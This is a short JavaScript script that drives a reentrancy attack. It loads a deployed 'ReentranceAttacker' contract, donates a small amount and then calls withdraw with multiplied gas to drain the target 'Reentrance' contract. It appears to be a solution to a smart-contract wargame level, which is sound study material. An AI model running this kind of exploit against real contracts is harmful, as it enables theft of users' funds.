const loadContract = require('../lib/load_deployed_contract_at_address')
const { keyToAccount } = require('../lib/eth_utils')
const { DEPLOYMENT_ACCOUNT_KEY } = require('../lib/env')

module.exports = async ({ attackerAddress }) => {
  const owner = keyToAccount(DEPLOYMENT_ACCOUNT_KEY)
  const from = owner.address
  const attacker = await loadContract('ReentranceAttacker', attackerAddress)

  console.log(`Executing attack to Reentrance...`)
  const donate_gas = await attacker.donate.estimateGas({ from })
  await attacker.donate.sendTransaction({ from, gas: donate_gas * 3, value: '10000000000000' })

  const withdraw_gas = await attacker.contract.methods.withdraw('10000000000000').estimateGas({ from })
  await attacker.contract.methods.withdraw('10000000000000').send({ from, gas: withdraw_gas * 5 })
}
